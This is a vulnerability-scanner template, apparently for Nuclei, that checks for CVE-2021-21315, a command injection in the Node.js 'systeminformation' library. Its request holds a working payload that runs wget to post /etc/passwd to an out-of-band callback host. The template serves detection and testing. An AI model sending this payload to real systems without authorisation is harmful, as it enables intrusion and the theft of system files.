http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - wget --post-file /etc/passwd {{interactsh-url}}
    - name
    - running
    - pids
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20{{interactsh-url}})'
id: CVE-2021-21315
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:systeminformation:systeminformation:*:*:*:*:*:node.js:*:*
    cve-id: CVE-2021-21315
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.8
    cwe-id: CWE-78
    epss-percentile: 0.99841
    epss-score: 0.93764
  description: Node.JS System Information Library System before version 5.3.1 is susceptible
    to remote command injection. Node.JS (npm package "systeminformation") is an open
    source collection of functions to retrieve detailed hardware, system and OS information.
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary commands on the affected system.

    '
  metadata:
    framework: node.js
    max-request: 1
    product: systeminformation
    vendor: systeminformation
  name: Node.JS System Information Library <5.3.1 - Remote Command Injection
  reference:
  - https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC
  - https://security.netapp.com/advisory/ntap-20210312-0007/
  - https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-2m8v-572m-ff2v
  - https://www.npmjs.com/package/systeminformation
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21315
  remediation: Upgrade to version 5.3.1. As a workaround instead of upgrading, be
    sure to check or sanitize service parameters that are passed to si.inetLatency(),
    si.inetChecksite(), si.services(), si.processLoad() ... do only allow strings,
    reject any arrays. String sanitation works as expected
  severity: high
  tags: cve,cve2021,nodejs,kev,systeminformation,node.js,vkev,vuln
